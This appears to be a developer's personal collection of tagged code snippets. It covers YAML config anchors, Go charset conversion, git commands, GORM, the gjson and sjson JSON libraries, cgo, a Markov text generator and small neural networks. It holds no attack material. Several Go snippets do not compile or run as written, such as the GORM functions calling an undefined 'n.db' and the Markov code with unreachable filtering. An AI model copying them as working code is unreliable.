  "staging": {
    "node_version": "13.0.0",
    "os": "ubuntu",
    "package_manager": "yarn",
    "run": ["yarn install", "NODE_ENV=${ENVIRONMENT} yarn build"],
    "env": {
      "ENVIRONMENT": "staging"
    }
  }
}
#yaml
base-config: &base
  node_version: 13.0.0
  os: ubuntu
  package_manager: yarn
  run:
    - yarn install
    - NODE_ENV=${ENVIRONMENT} yarn build

production:
  # Injection «base» attributes in production
  <<: *base
  env:
    - ENVIRONMENT: production

staging:
  # Injection «base» attributes in staging
  <<: *base
  env:
    - ENVIRONMENT: staging
==================================================
Convert between Windows-1251 and UTF-8
(tags: convert windows1251 utf8)
---

https://golangs.org/open-write-utf-8-file-charset

package main

import (
  "fmt"
  "io/ioutil"
  "os"
  "golang.org/x/text/encoding/charmap"
)

func main() {
  // Write string in Windows-1252
  encoder := charmap.Windows1252.NewEncoder()
  s, e := encoder.String("This is sample text with runes Š")
  if e != nil {
    panic(e)
  }
  ioutil.WriteFile("example.txt", []byte(s), os.ModePerm)

  // Decode in UTF-8
  f, e := os.Open("example.txt")
  if e != nil {
    panic(e)
  }
  defer f.Close()
  decoder := charmap.Windows1252.NewDecoder()
  reader := decoder.Reader(f)
  b, err := ioutil.ReadAll(reader)
  if err != nil {
    panic(err)
  }
  fmt.Println(string(b))
}
==================================================
Resetting remote to a certain commit
(tags: git reset remote commit)
---

https://stackoverflow.com/questions/5816688/resetting-remote-to-a-certain-commit

git reset --hard <commit-hash>
git push -f origin master
==================================================
Gorm many2many
(tags: gorm many2many)
---

import (
  "gorm.io/gorm"
)

type Topic struct {
  gorm.Model
  Id      int    `gorm:"primaryKey"`
  Title   string `gorm:"unique"`
  Code    string
  Checked bool
  Tags    []Tag `gorm:"many2many:topic_tags;"`
}

//type TopicTags struct {
//  gorm.Model
//  Id int `gorm:"primaryKey"`
//  Topics []Topic `gorm:"many2many:topic_tags;"`
//  Tags    []Tag `gorm:"many2many:topic_tags;"`
//}

type Tag struct {
  gorm.Model
  Id     int     `gorm:"primaryKey"`
  Name   string  `gorm:"unique"`
  Topics []Topic `gorm:"many2many:topic_tags;"`
}

// Create new topic
func create(db *gorm.DB, query string) Topic {
  topic := &Topic{
    Title: "Some title",
    Code: "Some code",
    Tags: []Tag{
      {
        Name: "testtag",
      },
    },
  }
  tags := topic.Tags
  for i, tag := range tags {
    db.Where("name = ?", tag.Name).Find(&tag)
    if tag.Id == 0 {
      db.Create(&tag)
    }
    tags[i] = tag
  }
  topic.Tags = tags
  db.Create(topic)
  return *topic
}

// Get all tags
func getAllTags(db *gorm.DB) []Tag {
  var tags []Tag
  n.db.Find(&tags)
  return tags
}

// Get all topics
func getAllTopics(db *gorm.DB) []Topic {
  var topics []Topic
  n.db.Find(&topics)
  return topics
}

// Get topics that have some tags
func getTopicsWithTags(db *gorm.DB, queryTags []string) []Topic {
  // get matched tags
  var tags []Tag
  n.db.Where("name IN ?", queryTags).Find(&tags)

  // get associated topics by tags
  var topics []Topic
  n.db.Model(&tags).Association("Topics").Find(&topics)

  // return topics

  // make set deduplicate topics
  set := make(map[string]Topic)
  for _, topic := range topics {
    set[topic.Title] = topic
  }

  // struct for sorting
  var matchTopic struct {
    match int
    topic Topic
  }

  // make slice for counting matches
  matches := make([]matchTopic, 0, len(set))
  for _, topic := range set {
    // add tags to topic struct
    n.db.Model(&topic).Association("Tags").Find(&topic.Tags)
    match := 0
    for _, tag := range topic.Tags {
      for _, queryTag := range queryTags {
        if tag.Name == queryTag {
          match++
        }
      }
    }
    matches = append(matches, matchTopic{match: match, topic: topic})
  }

  // sort slice by matches desc
  sort.Slice(matches, func(i, j int) bool {
    return matches[i].match > matches[j].match
  })

  res := make([]Topic, 0, len(matches))
  for _, val := range matches {
    res = append(res, val.topic)
  }
  return res
}
==================================================
Get json without serialisation
(tags: get json gjson)
---

https://github.com/tidwall/gjson

package main

import "github.com/tidwall/gjson"

const json = `{"name":{"first":"Janet","last":"Prichard"},"age":47}`

func main() {
  value := gjson.Get(json, "name.last")
  println(value.String())
}

{
  "name": {"first": "Tom", "last": "Anderson"},
  "age":37,
  "children": ["Sara","Alex","Jack"],
  "fav.movie": "Deer Hunter",
  "friends": [
    {"first": "Dale", "last": "Murphy", "age": 44, "nets": ["ig", "fb", "tw"]},
    {"first": "Roger", "last": "Craig", "age": 68, "nets": ["fb", "tw"]},
    {"first": "Jane", "last": "Murphy", "age": 47, "nets": ["ig", "tw"]}
  ]
}

// path in gjson.Get
"name.last"          >> "Anderson"
"age"                >> 37
"children"           >> ["Sara","Alex","Jack"]
"children.#"         >> 3
"children.1"         >> "Alex"
"child*.2"           >> "Jack"
"c?ildren.0"         >> "Sara"
"fav\.movie"         >> "Deer Hunter"
"friends.#.first"    >> ["Dale","Roger","Jane"]
"friends.1.last"     >> "Craig"

friends.#(last=="Murphy").first    >> "Dale"
friends.#(last=="Murphy")#.first   >> ["Dale","Jane"]
friends.#(age>45)#.last            >> ["Craig","Murphy"]
friends.#(first%"D*").last         >> "Murphy"
friends.#(first!%"D*").last        >> "Craig"
friends.#(nets.#(=="fb"))#.first   >> ["Dale","Roger"]

// types
bool, for JSON booleans
float64, for JSON numbers
string, for JSON string literals
nil, for JSON null

result.Type    // can be String, Number, True, False, Null, or JSON
result.Str     // holds the string
result.Num     // holds the float64 number
result.Raw     // holds the raw json
result.Index   // index of raw value in original json, zero means index unknown

"children|@reverse"           >> ["Jack","Alex","Sara"]
"children|@reverse|0"         >> "Jack"

// modifiers
@reverse: Reverse an array or the members of an object.
@ugly: Remove all whitespace from a json document.
@pretty: Make the json document more human readable.
@this: Returns the current element. It can be used to retrieve the root element.
@valid: Ensure the json document is valid.
@flatten: Flattens an array.
@join: Joins multiple objects into a single object.

// Custom modifiers
gjson.AddModifier("case", func(json, arg string) string {
  if arg == "upper" {
    return strings.ToUpper(json)
  }
  if arg == "lower" {
    return strings.ToLower(json)
  }
  return json
})
"children|@case:upper"           >> ["SARA","ALEX","JACK"]
"children|@case:lower|@reverse"  >> ["jack","alex","sara"]

// JSON Lines
{"name": "Gilbert", "age": 61}
{"name": "Alexa", "age": 34}
{"name": "May", "age": 57}
{"name": "Deloise", "age": 44}
..#                   >> 4
..1                   >> {"name": "Alexa", "age": 34}
..3                   >> {"name": "Deloise", "age": 44}
..#.name              >> ["Gilbert","Alexa","May","Deloise"]
..#(name="May").age   >> 57

// Unmarshal to a map
m, ok := gjson.Parse(json).Value().(map[string]interface{})
if !ok {
  // not a map
}

// Validate JSON
if !gjson.Valid(json) {
  return errors.New("invalid json")
}
value := gjson.Get(json, "name.last")

// For each
result := gjson.Get(json, "programmers")
result.ForEach(func(key, value gjson.Result) bool {
  println(value.String())
  return true // keep iterating
})
==================================================
Set json without serialisation
(tags: set json sjson)
---

https://github.com/tidwall/sjson

package main

import "github.com/tidwall/sjson"

const json = `{"name":{"first":"Janet","last":"Prichard"},"age":47}`

func main() {
  value, _ := sjson.Set(json, "name.last", "Anderson")
  println(value)
}

// Set a value from empty document:
value, _ := sjson.Set("", "name", "Tom")
println(value)
// Output:
// {"name":"Tom"}

// Set a nested value from empty document:
value, _ := sjson.Set("", "name.last", "Anderson")
println(value)
// Output:
// {"name":{"last":"Anderson"}}

// Set a new value:
value, _ := sjson.Set(`{"name":{"last":"Anderson"}}`, "name.first", "Sara")
println(value)
// Output:
// {"name":{"first":"Sara","last":"Anderson"}}

// Update an existing value:
value, _ := sjson.Set(`{"name":{"last":"Anderson"}}`, "name.last", "Smith")
println(value)
// Output:
// {"name":{"last":"Smith"}}

// Set a new array value:
value, _ := sjson.Set(`{"friends":["Andy","Carol"]}`, "friends.2", "Sara")
println(value)
// Output:
// {"friends":["Andy","Carol","Sara"]

// Append an array value by using the -1 key in a path:
value, _ := sjson.Set(`{"friends":["Andy","Carol"]}`, "friends.-1", "Sara")
println(value)
// Output:
// {"friends":["Andy","Carol","Sara"]

// Append an array value that is past the end:
value, _ := sjson.Set(`{"friends":["Andy","Carol"]}`, "friends.4", "Sara")
println(value)
// Output:
// {"friends":["Andy","Carol",null,null,"Sara"]

// Delete a value:
value, _ := sjson.Delete(`{"name":{"first":"Sara","last":"Anderson"}}`, "name.first")
println(value)
// Output:
// {"name":{"last":"Anderson"}}

// Delete an array value:
value, _ := sjson.Delete(`{"friends":["Andy","Carol"]}`, "friends.1")
println(value)
// Output:
// {"friends":["Andy"]}

// Delete the last array value:
value, _ := sjson.Delete(`{"friends":["Andy","Carol"]}`, "friends.-1")
println(value)
// Output:
// {"friends":["Andy"]}
==================================================
Git rename local and remote branch
(tags: git rename branch)
---

https://stackoverflow.com/questions/30590083/how-do-i-rename-both-a-git-local-and-remote-branch-name

// Renaming local and remote
# Rename the local branch to the new name
git branch -m <old_name> <new_name>
# Delete the old branch on remote - where <remote> is, for example, origin
git push <remote> --delete <old_name>
# Or shorter way to delete remote branch [:]
git push <remote> :<old_name>
# Prevent git from using the old name when pushing in the next step.
# Otherwise, git will use the old upstream name instead of <new_name>.
git branch --unset-upstream <old_name>
# Push the new branch to remote
git push <remote> <new_name>
# Reset the upstream branch for the new_name local branch
git push <remote> -u <new_name>

// Renaming Only remote branch
# In this option, we will push the branch to the remote with the new name
# While keeping the local name as is
git push <remote> <remote>/<old_name>:refs/heads/<new_name> :<old_name>
==================================================
Switch between users on terminal
(tags: switch user terminal)
---

$ whoami
user1
$ su - user2
Password:
$ whoami
user2
$ sudo -s
Password:
$ whoami
root
==================================================
Cgo
(tags: cgo)
---

https://github.com/golang/go/wiki/cgo

package main

/*
#include <stdio.h>
#include <stdlib.h>

void myprint(char* s) {
  printf("%s\n", s);
}
*/
import "C"

import "unsafe"

func Example() {
  cs := C.CString("Hello from stdio\n")
  C.myprint(cs)
  C.free(unsafe.Pointer(cs))
}

func main() {
  Example()
}
==================================================
Generate text with Markov chain algorythm
(tags: markov text)
---

https://kodazm.ru/articles/markov-twitter-botnet/

package main

import (
  "fmt"
  "io/ioutil"
  "math/rand"
  "regexp"
  "strconv"
  "strings"
  "tbot/internal/errors"
)

func main() {
  states := initialize("book.txt")
  word := "human"
  count := 10
  result := generateText(states, word, count)
  fmt.Println(result)
}

type State struct {
  Id         int
  Word       string
  Count      int
  Prob       float64
  NextStates []State
}

func initialize(file string) []State {
  text := readTxt(file)
  return train(text)
}

func readTxt(path string) string {
  data, err := ioutil.ReadFile(path)
  errors.PanicIfErr(err)
  dataClean := strings.Replace(string(data), "\n", " ", -1)
  dataClean = strings.Replace(dataClean, ".", "", -1)
  dataClean = strings.Replace(dataClean, ",", "", -1)
  dataClean = strings.Replace(dataClean, "-", "", -1)
  dataClean = strings.Replace(dataClean, "!", "", -1)
  dataClean = strings.Replace(dataClean, "?", "", -1)
  dataClean = strings.Replace(dataClean, "[", "", -1)
  dataClean = strings.Replace(dataClean, "]", "", -1)
  dataClean = strings.ToLower(dataClean)
  dataClean = strings.Replace(dataClean, "бог", "Бог", -1)
  return dataClean
}

func printLoading(n int, total int) {
  var bar []string
  tantPerFourty := int((float64(n) / float64(total)) * 40)
  tantPerCent := int((float64(n) / float64(total)) * 100)
  for i := 0; i < tantPerFourty; i++ {
    bar = append(bar, "█")
  }
  progressBar := strings.Join(bar, "")
  fmt.Printf("\r " + progressBar + " - " + strconv.Itoa(tantPerCent) + "")
}

func addWordToStates(states []State, word string) ([]State, int) {
  iState := -1
  for i := 0; i < len(states); i++ {
    if states[i].Word == word {
      iState = i
    }
  }
  if iState >= 0 {
    states[iState].Count++
  } else {
    var tempState State
    tempState.Word = word
    tempState.Count = 1

    states = append(states, tempState)
    iState = len(states) - 1

  }
  return states, iState
}

func calcMarkovStates(words []string) []State {
  var states []State
  //count words
  for i := 0; i < len(words)-1; i++ {
    var iState int
    states, iState = addWordToStates(states, words[i])
    if iState < len(words) {
      states[iState].NextStates, _ = addWordToStates(states[iState].NextStates, words[i+1])
    }

    printLoading(i, len(words))
  }

  //count prob
  for i := 0; i < len(states); i++ {
    states[i].Prob = (float64(states[i].Count) / float64(len(words)) * 100)
    for j := 0; j < len(states[i].NextStates); j++ {
      states[i].NextStates[j].Prob = (float64(states[i].NextStates[j].Count) / float64(len(words)) * 100)
    }
  }
  fmt.Println("\ntotal words computed: " + strconv.Itoa(len(words)))
  return states
}

func textToWords(text string) []string {
  s := strings.Split(text, " ")
  return s
  words := make([]string, 0, len(s))
  patternDigits := *regexp.MustCompile(`[\d]`)
  patternEngWord := *regexp.MustCompile(`[a-zA-Z]`)
  for _, word := range s {
    if word == "" || patternDigits.Match([]byte(word)) || patternEngWord.Match([]byte(word)) {
      continue
    }
    words = append(words, word)
  }
  return words
}

func train(text string) []State {
  words := textToWords(text)
  states := calcMarkovStates(words)
  return states
}

//-----------------

func getNextMarkovState(states []State, word string) string {
  iState := -1
  for i := 0; i < len(states); i++ {
    if states[i].Word == word {
      iState = i
    }
  }
  if iState < 0 {
    return "word no exist on the memory"
  }
  var next State
  next = states[iState].NextStates[0]
  next.Prob = rand.Float64() * states[iState].Prob
  for i := 0; i < len(states[iState].NextStates); i++ {
    if (rand.Float64()*states[iState].NextStates[i].Prob) > next.Prob && states[iState-1].Word != states[iState].NextStates[i].Word {
      next = states[iState].NextStates[i]
    }
  }
  return next.Word
}

func generateText(states []State, initWord string, count int) string {
  var generatedText []string
  word := initWord
  generatedText = append(generatedText, word)
  for i := 0; i < count; i++ {
    word = getNextMarkovState(states, word)
    if word == "word no exist on the memory" {
      return "word no exist on the memory"
    }
    generatedText = append(generatedText, word)
  }
  //generatedText = append(generatedText, ".")
  text := strings.Join(generatedText, " ")
  return text
}
==================================================
Simple neural network with gonum
(tags: neural gonum)
---

https://github.com/dwhitena/gophernet

package main

import (
  "encoding/csv"
  "errors"
  "fmt"
  "log"
  "math"
  "math/rand"
  "os"
  "strconv"
  "time"

  "gonum.org/v1/gonum/floats"
  "gonum.org/v1/gonum/mat"
)

// neuralNet contains all of the information
// that defines a trained neural network.
type neuralNet struct {
  config  neuralNetConfig
  wHidden *mat.Dense
  bHidden *mat.Dense
  wOut    *mat.Dense
  bOut    *mat.Dense
}

// neuralNetConfig defines our neural network
// architecture and learning parameters.
type neuralNetConfig struct {
  inputNeurons  int
  outputNeurons int
  hiddenNeurons int
  numEpochs     int
  learningRate  float64
}

func main() {

  // Form the training matrices.
  inputs, labels := makeInputsAndLabels("data/train.csv")

  // Define our network architecture and learning parameters.
  config := neuralNetConfig{
    inputNeurons:  4,
    outputNeurons: 3,
    hiddenNeurons: 3,
    numEpochs:     5000,
    learningRate:  0.3,
  }

  // Train the neural network.
  network := newNetwork(config)
  if err := network.train(inputs, labels); err != nil {
    log.Fatal(err)
  }

  // Form the testing matrices.
  testInputs, testLabels := makeInputsAndLabels("data/test.csv")

  // Make the predictions using the trained model.
  predictions, err := network.predict(testInputs)
  if err != nil {
    log.Fatal(err)
  }

  // Calculate the accuracy of our model.
  var truePosNeg int
  numPreds, _ := predictions.Dims()
  for i := 0; i < numPreds; i++ {

    // Get the label.
    labelRow := mat.Row(nil, i, testLabels)
    var prediction int
    for idx, label := range labelRow {
      if label == 1.0 {
        prediction = idx
        break
      }
    }

    // Accumulate the true positive/negative count.
    if predictions.At(i, prediction) == floats.Max(mat.Row(nil, i, predictions)) {
      truePosNeg++
    }
  }

  // Calculate the accuracy (subset accuracy).
  accuracy := float64(truePosNeg) / float64(numPreds)

  // Output the Accuracy value to standard out.
  fmt.Printf("\nAccuracy = %0.2f\n\n", accuracy)
}

// NewNetwork initializes a new neural network.
func newNetwork(config neuralNetConfig) *neuralNet {
  return &neuralNet{config: config}
}

// train trains a neural network using backpropagation.
func (nn *neuralNet) train(x, y *mat.Dense) error {

  // Initialize biases/weights.
  randSource := rand.NewSource(time.Now().UnixNano())
  randGen := rand.New(randSource)

  wHidden := mat.NewDense(nn.config.inputNeurons, nn.config.hiddenNeurons, nil)
  bHidden := mat.NewDense(1, nn.config.hiddenNeurons, nil)
  wOut := mat.NewDense(nn.config.hiddenNeurons, nn.config.outputNeurons, nil)
  bOut := mat.NewDense(1, nn.config.outputNeurons, nil)

  wHiddenRaw := wHidden.RawMatrix().Data
  bHiddenRaw := bHidden.RawMatrix().Data
  wOutRaw := wOut.RawMatrix().Data
  bOutRaw := bOut.RawMatrix().Data

  for _, param := range [][]float64{
    wHiddenRaw,
    bHiddenRaw,
    wOutRaw,
    bOutRaw,
  } {
    for i := range param {
      param[i] = randGen.Float64()
    }
  }

  // Define the output of the neural network.
  output := new(mat.Dense)

  // Use backpropagation to adjust the weights and biases.
  if err := nn.backpropagate(x, y, wHidden, bHidden, wOut, bOut, output); err != nil {
    return err
  }

  // Define our trained neural network.
  nn.wHidden = wHidden
  nn.bHidden = bHidden
  nn.wOut = wOut
  nn.bOut = bOut

  return nil
}

// backpropagate completes the backpropagation method.
func (nn *neuralNet) backpropagate(x, y, wHidden, bHidden, wOut, bOut, output *mat.Dense) error {

  // Loop over the number of epochs utilizing
  // backpropagation to train our model.
  for i := 0; i < nn.config.numEpochs; i++ {

    // Complete the feed forward process.
    hiddenLayerInput := new(mat.Dense)
    hiddenLayerInput.Mul(x, wHidden)
    addBHidden := func(_, col int, v float64) float64 { return v + bHidden.At(0, col) }
    hiddenLayerInput.Apply(addBHidden, hiddenLayerInput)

    hiddenLayerActivations := new(mat.Dense)
    applySigmoid := func(_, _ int, v float64) float64 { return sigmoid(v) }
    hiddenLayerActivations.Apply(applySigmoid, hiddenLayerInput)

    outputLayerInput := new(mat.Dense)
    outputLayerInput.Mul(hiddenLayerActivations, wOut)
    addBOut := func(_, col int, v float64) float64 { return v + bOut.At(0, col) }
    outputLayerInput.Apply(addBOut, outputLayerInput)
    output.Apply(applySigmoid, outputLayerInput)

    // Complete the backpropagation.
    networkError := new(mat.Dense)
    networkError.Sub(y, output)

    slopeOutputLayer := new(mat.Dense)
    applySigmoidPrime := func(_, _ int, v float64) float64 { return sigmoidPrime(v) }
    slopeOutputLayer.Apply(applySigmoidPrime, output)
    slopeHiddenLayer := new(mat.Dense)
    slopeHiddenLayer.Apply(applySigmoidPrime, hiddenLayerActivations)

    dOutput := new(mat.Dense)
    dOutput.MulElem(networkError, slopeOutputLayer)
    errorAtHiddenLayer := new(mat.Dense)
    errorAtHiddenLayer.Mul(dOutput, wOut.T())

    dHiddenLayer := new(mat.Dense)
    dHiddenLayer.MulElem(errorAtHiddenLayer, slopeHiddenLayer)

    // Adjust the parameters.
    wOutAdj := new(mat.Dense)
    wOutAdj.Mul(hiddenLayerActivations.T(), dOutput)
    wOutAdj.Scale(nn.config.learningRate, wOutAdj)
    wOut.Add(wOut, wOutAdj)

    bOutAdj, err := sumAlongAxis(0, dOutput)
    if err != nil {
      return err
    }
    bOutAdj.Scale(nn.config.learningRate, bOutAdj)
    bOut.Add(bOut, bOutAdj)

    wHiddenAdj := new(mat.Dense)
    wHiddenAdj.Mul(x.T(), dHiddenLayer)
    wHiddenAdj.Scale(nn.config.learningRate, wHiddenAdj)
    wHidden.Add(wHidden, wHiddenAdj)

    bHiddenAdj, err := sumAlongAxis(0, dHiddenLayer)
    if err != nil {
      return err
    }
    bHiddenAdj.Scale(nn.config.learningRate, bHiddenAdj)
    bHidden.Add(bHidden, bHiddenAdj)
  }

  return nil
}

// predict makes a prediction based on a trained
// neural network.
func (nn *neuralNet) predict(x *mat.Dense) (*mat.Dense, error) {

  // Check to make sure that our neuralNet value
  // represents a trained model.
  if nn.wHidden == nil || nn.wOut == nil {
    return nil, errors.New("the supplied weights are empty")
  }
  if nn.bHidden == nil || nn.bOut == nil {
    return nil, errors.New("the supplied biases are empty")
  }

  // Define the output of the neural network.
  output := new(mat.Dense)

  // Complete the feed forward process.
  hiddenLayerInput := new(mat.Dense)
  hiddenLayerInput.Mul(x, nn.wHidden)
  addBHidden := func(_, col int, v float64) float64 { return v + nn.bHidden.At(0, col) }
  hiddenLayerInput.Apply(addBHidden, hiddenLayerInput)

  hiddenLayerActivations := new(mat.Dense)
  applySigmoid := func(_, _ int, v float64) float64 { return sigmoid(v) }
  hiddenLayerActivations.Apply(applySigmoid, hiddenLayerInput)

  outputLayerInput := new(mat.Dense)
  outputLayerInput.Mul(hiddenLayerActivations, nn.wOut)
  addBOut := func(_, col int, v float64) float64 { return v + nn.bOut.At(0, col) }
  outputLayerInput.Apply(addBOut, outputLayerInput)
  output.Apply(applySigmoid, outputLayerInput)

  return output, nil
}

// sigmoid implements the sigmoid function
// for use in activation functions.
func sigmoid(x float64) float64 {
  return 1.0 / (1.0 + math.Exp(-x))
}

// sigmoidPrime implements the derivative
// of the sigmoid function for backpropagation.
func sigmoidPrime(x float64) float64 {
  return sigmoid(x) * (1.0 - sigmoid(x))
}

// sumAlongAxis sums a matrix along a
// particular dimension, preserving the
// other dimension.
func sumAlongAxis(axis int, m *mat.Dense) (*mat.Dense, error) {

  numRows, numCols := m.Dims()

  var output *mat.Dense

  switch axis {
  case 0:
    data := make([]float64, numCols)
    for i := 0; i < numCols; i++ {
      col := mat.Col(nil, i, m)
      data[i] = floats.Sum(col)
    }
    output = mat.NewDense(1, numCols, data)
  case 1:
    data := make([]float64, numRows)
    for i := 0; i < numRows; i++ {
      row := mat.Row(nil, i, m)
      data[i] = floats.Sum(row)
    }
    output = mat.NewDense(numRows, 1, data)
  default:
    return nil, errors.New("invalid axis, must be 0 or 1")
  }

  return output, nil
}

func makeInputsAndLabels(fileName string) (*mat.Dense, *mat.Dense) {
  // Open the dataset file.
  f, err := os.Open(fileName)
  if err != nil {
    log.Fatal(err)
  }
  defer f.Close()

  // Create a new CSV reader reading from the opened file.
  reader := csv.NewReader(f)
  reader.FieldsPerRecord = 7

  // Read in all of the CSV records
  rawCSVData, err := reader.ReadAll()
  if err != nil {
    log.Fatal(err)
  }

  // inputsData and labelsData will hold all the
  // float values that will eventually be
  // used to form matrices.
  inputsData := make([]float64, 4*len(rawCSVData))
  labelsData := make([]float64, 3*len(rawCSVData))

  // Will track the current index of matrix values.
  var inputsIndex int
  var labelsIndex int

  // Sequentially move the rows into a slice of floats.
  for idx, record := range rawCSVData {

    // Skip the header row.
    if idx == 0 {
      continue
    }

    // Loop over the float columns.
    for i, val := range record {

      // Convert the value to a float.
      parsedVal, err := strconv.ParseFloat(val, 64)
      if err != nil {
        log.Fatal(err)
      }

      // Add to the labelsData if relevant.
      if i == 4 || i == 5 || i == 6 {
        labelsData[labelsIndex] = parsedVal
        labelsIndex++
        continue
      }

      // Add the float value to the slice of floats.
      inputsData[inputsIndex] = parsedVal
      inputsIndex++
    }
  }
  inputs := mat.NewDense(len(rawCSVData), 4, inputsData)
  labels := mat.NewDense(len(rawCSVData), 3, labelsData)
  return inputs, labels
}
==================================================
Neural network with GoNN
(tags: neural gonn)
---

https://habr.com/ru/post/343466/

package main

import (
  "fmt"
  "github.com/fxsjy/gonn/gonn"
)

func main() {
  // create neural net and save it in file gonn
  CreateNN()

  // load NN from file
  nn := gonn.LoadNN("gonn")

  hp := 0.7 // (0.1 - 1.0)
  weapon := 1.0 //(0 - no, 1 - yes)
  enemyCount := 1.0

  // Get answer from NN
  out := nn.Forward([]float64{hp, weapon, enemyCount})
  fmt.Println(GetResult(out))
}

func CreateNN() {
  // Create NN with 3 input neurons, 16 hidden, 4 outputs
  nn := gonn.DefaultNetwork(3, 16, 4, false)

  // Create slice with input params:
  // 0 param - hp (0.1 - 1.0)
  // 1 param - have weapon (0 - no, 1 - yes)
  // 2 param - enemy count
  input := [][]float64 {
    {0.5, 1, 1}, {0.9, 1, 2}, {0.8, 0, 1},
    {0.3, 1, 1}, {0.6, 1, 2}, {0.4, 0, 1},
    {0.9, 1, 7}, {0.6, 1, 4}, {0.1, 0, 1},
    {0.6, 1, 0}, {1, 0, 0} }

  // What we want to get in result
  // 0 param "Attack"
  // 1 param "Creep"
  // 2 param "Run"
  // 3 param "Nothing"
  target := [][]float64 {
    {1, 0, 0, 0}, {1, 0, 0, 0}, {1, 0, 0, 0},
    {0, 1, 0, 0}, {0, 1, 0, 0}, {0, 1, 0, 0},
    {0, 0, 1, 0}, {0, 0, 1, 0}, {0, 0, 1, 0},
    {0, 0, 0, 1}, {0, 0, 0, 1} }

  // Train NN with 100000 iterations
  nn.Train(input, target, 100000)

  // Save NN in file
  gonn.DumpNN("gonn", nn)
}

func GetResult(output []float64) string {
  max := -99999.0
  pos := -1
  // Get one output neuron with biggest weight
  for i, value := range output {
    if value > max {
      max = value
      pos = i
    }
  }

  switch pos {
  case 0: return "Attack"
  case 1: return "Creep"
  case 2: return "Run"
  case 3: return "Nothing"
  }
  return ""
}